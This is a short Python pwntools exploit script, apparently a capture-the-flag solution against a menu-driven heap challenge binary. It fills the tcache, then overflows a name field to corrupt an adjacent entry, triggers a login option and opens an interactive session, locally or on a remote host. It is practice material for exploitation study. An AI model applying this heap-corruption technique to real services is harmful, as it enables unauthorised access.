#!/usr/bin/env python3 

from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF("./chal_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
gs = '''
# brva 0x14a5
set max-visualize-chunk-size 40
c
'''

def init():
    if args.LOCAL:
        p = process(exe.path)
        # gdb.attach(p, gdbscript=gs)
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])

    return p 

p = init()

def create(idx, name):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(idx))
    p.sendafter(b"> ", name)
    
def select(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(idx))

def show():
    p.sendlineafter(b"> ", b"3")

def delete(idx):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"> ", str(idx))

def login():
    p.sendlineafter(b"> ", b"5")

for i in range(7):
   create(i, b"\00"*12)
   delete(i)
create(0, b"C"*12)
create(1, b"B"*12)

delete(0)
create(0, b"A"*0x21)    
delete(0)
create(0, b"A"*0x22)    

select(1)
login()


p.interactive()